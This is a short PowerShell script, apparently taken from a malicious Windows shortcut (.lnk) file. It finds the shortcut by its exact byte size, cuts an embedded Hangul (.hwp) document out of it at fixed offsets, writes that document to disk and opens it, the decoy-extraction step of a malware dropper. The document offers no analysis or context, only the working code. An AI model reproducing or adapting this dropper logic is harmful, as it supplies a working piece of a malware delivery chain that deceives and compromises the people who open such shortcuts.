$lk=ls -Path '.\' -filter '*.lnk';
for($a = 0;$a -lt $lk.length;$a++){if($lk[$a].length -eq 56397) {$lk=$lk[$a].name;break}}
ac -path "C:\Users\user\Downloads\1.txt" $lk
if($lk -eq $null) {$lk=ls -Path $env:temp -depth 2 | Where {$_.length -eq 56397}};
$n=$lk.name.Replace('.lnk','.hwp');

$lk=$lk.FullName;$file = [System.IO.File]::ReadAllBytes($lk);$file1=[byte[]]$file[5709..(5709+50688-1)];

$fsdf=$lk.Replace('.lnk','.hwp');[System.IO.File]::WriteAllBytes($fsdf,$file1);
&$fsdf;










